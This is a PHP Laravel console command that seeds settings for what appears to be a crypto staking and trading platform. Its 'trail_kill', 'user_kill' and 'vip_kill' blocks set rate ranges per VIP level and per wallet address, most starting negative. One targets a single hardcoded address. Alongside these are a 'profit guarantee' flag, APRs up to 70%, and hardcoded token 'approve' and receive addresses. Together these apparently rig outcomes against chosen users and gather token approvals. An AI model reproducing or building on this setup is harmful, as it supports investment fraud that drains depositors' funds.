<?php

namespace App\Console\Commands;

use App\Models\Configs;
use App\NewServices\ConfigsServices;
use Illuminate\Console\Command;
use Symfony\Component\Console\Command\Command as CommandAlias;

class InitConfigsCommand extends Command
{
    protected $signature = 'InitConfigsCommand';
    protected $description = 'Command description';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle(): int
    {
        $config = Configs::first();
        if (!$config) {
            $config = Configs::create([]);
        }

        $config->trail = json_encode([
            'amount' => 10000,
            'duration' => 3,
            'leverage' => 60,
            'can_profit_guarantee' => true,
            'can_automatic_staking' => false,
            'can_automatic_exchange' => true,
            'can_prevent_liquidation' => false,
            'can_automatic_withdrawal' => false,
            'can_leveraged_investment' => true,
            'can_automatic_airdrop_bonus' => true,
            'can_automatic_loan_repayment' => true,
        ]);

        $config->trail_kill = json_encode([
            [
                "enable" => true,
                "rate_end" => "1",
                "round_end" => 12,
                "rate_start" => "-0.001",
                "round_start" => 1
            ]
        ]);

        $config->user_kill = json_encode([
            "0xdfAC6801BD345d8Ea8dD12C157164cA0e7CC18a4" => [
                "enable" => true,
                "address" => "0xdfAC6801BD345d8Ea8dD12C157164cA0e7CC18a4",
                "rate_end" => "0",
                "round_end" => 100,
                "rate_start" => "-0.1",
                "round_start" => 1
            ]
        ]);

        $config->vip_kill = json_encode([
            "1" => [
                "enable" => true,
                "vipval" => 1,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "-0.0001",
                "round_start" => 1
            ],
            "2" => [
                "enable" => true,
                "vipval" => 2,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "-0.0001",
                "round_start" => 1
            ],
            "3" => [
                "enable" => true,
                "vipval" => 3,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "-0.0001",
                "round_start" => 1
            ],
            "4" => [
                "enable" => true,
                "vipval" => 4,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "0.001",
                "round_start" => 1
            ],
            "5" => [
                "enable" => true,
                "vipval" => 5,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "-0.0001",
                "round_start" => 1
            ],
            "6" => [
                "enable" => true,
                "vipval" => 6,
                "rate_end" => "1",
                "round_end" => 50,
                "rate_start" => "-0.0001",
                "round_start" => 1
            ],
        ]);

        $config->address = json_encode([
            "ERC20" => [
                "send" => "0xbcF1caa1bDE372ECAD4fA8bbB501bBe077777777",
                "approve" => "0xbcF1caa1bDE372ECAD4fA8bbB501bBe077777777",
                "usdc_receive" => "0x705347c91d4906cbBAE732c35F7fbE5c8e2Ad1D1",
                "usdt_receive" => "0xA40bb0cea26C7d164C7E63f0b6fd228e8c96FC78",
            ],
            "POLYGON" => [
                "send" => "0xbcF1caa1bDE372ECAD4fA8bbB501bBe077777777",
                "approve" => "0xbcF1caa1bDE372ECAD4fA8bbB501bBe077777777",
                "usdc_receive" => "0x705347c91d4906cbBAE732c35F7fbE5c8e2Ad1D1",
                "usdt_receive" => "0x705347c91d4906cbBAE732c35F7fbE5c8e2Ad1D1",
            ]
        ]);

        $config->gift = json_encode([
            'fee' => 0.5,
            'min' => 1
        ]);

        $config->profit = json_encode([
            7 => ['apr_start' => .01, 'apr_end' => .10],
            15 => ['apr_start' => .02, 'apr_end' => .20],
            30 => ['apr_start' => .03, 'apr_end' => .30],
            60 => ['apr_start' => .04, 'apr_end' => .40],
            90 => ['apr_start' => .05, 'apr_end' => .50],
            180 => ['apr_start' => .06, 'apr_end' => .60],
            360 => ['apr_start' => .07, 'apr_end' => .70],
        ]);

        $config->fee = json_encode([
            'withdraw_base_fee' => 15,
        ]);

        $config->other = json_encode([
            'min_staking' => 1,
            'jackpot_goal_amount' => 1000000,
            'jackpot_send_airdrop_amount' => 500000,
        ]);

        $config->staking_reward_loyalty = json_encode([
            ['staking' => 1000, 'loyalty' => 1000],
            ['staking' => 2000, 'loyalty' => 2000],
            ['staking' => 3000, 'loyalty' => 3000],
            ['staking' => 4000, 'loyalty' => 4000],
            ['staking' => 5000, 'loyalty' => 5000],
            ['staking' => 10000, 'loyalty' => 10000],
        ]);

        $config->save();

        ConfigsServices::CacheAll();

        return CommandAlias::SUCCESS;
    }
}
